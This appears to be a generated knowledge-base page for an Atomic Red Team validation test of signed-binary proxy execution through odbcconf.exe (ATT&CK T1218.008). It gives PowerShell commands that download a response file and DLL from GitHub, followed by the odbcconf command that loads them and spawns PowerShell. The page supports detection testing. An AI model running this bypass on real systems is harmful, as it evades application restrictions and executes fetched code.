---
atomic_guid: "331ce274-f9c9-440b-9f8c-a1006e1fce0b"
title: "Odbcconf.exe - Load Response File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.008"
attack_technique_name: "Signed Binary Proxy Execution: Odbcconf"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "331ce274-f9c9-440b-9f8c-a1006e1fce0b"
  - "Odbcconf.exe - Load Response File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Odbcconf.exe - Load Response File

Execute arbitrary response file that will spawn PowerShell.exe.
Source files: https://github.com/woanware/application-restriction-bypasses

## Metadata

- Atomic GUID: 331ce274-f9c9-440b-9f8c-a1006e1fce0b
- Technique: T1218.008: Signed Binary Proxy Execution: Odbcconf
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218.008/T1218.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.008]]

## Input Arguments

### rsp_file_name

- description: Response file name to load
- type: string
- default: T1218.008.rsp

### rsp_file_path

- description: Response file path
- type: string
- default: PathToAtomicsFolder\T1218.008\bin\

## Dependencies

T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})

### Prerequisite Check

```text
if (Test-Path "#{rsp_file_path}#{rsp_file_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp" -OutFile "#{rsp_file_path}#{rsp_file_name}"
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll" -OutFile "#{rsp_file_path}\o.dll"
```

## Executor

- name: command_prompt

### Command

```commandprompt
cd "#{rsp_file_path}"
odbcconf.exe -f "#{rsp_file_name}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml)
